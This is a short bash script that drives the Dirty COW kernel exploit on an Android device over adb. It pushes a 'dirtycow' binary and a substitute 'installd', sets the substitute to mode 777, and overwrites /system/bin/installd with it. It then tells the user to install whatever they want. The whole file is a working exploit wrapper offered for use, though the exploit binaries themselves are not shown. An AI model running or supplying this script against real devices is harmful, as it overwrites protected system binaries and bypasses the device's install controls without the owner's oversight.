#!/bin/bash

adb push dirtycow /data/local/tmp/dirtycow
adb push installd /data/local/tmp/installd
echo "Running exploit, may take some time"
adb shell 'chmod 777 /data/local/tmp/installd'
adb shell '/data/local/tmp/dirtycow /system/bin/installd /data/local/tmp/installd'
echo "Install what ever you want now via 'adb install'"
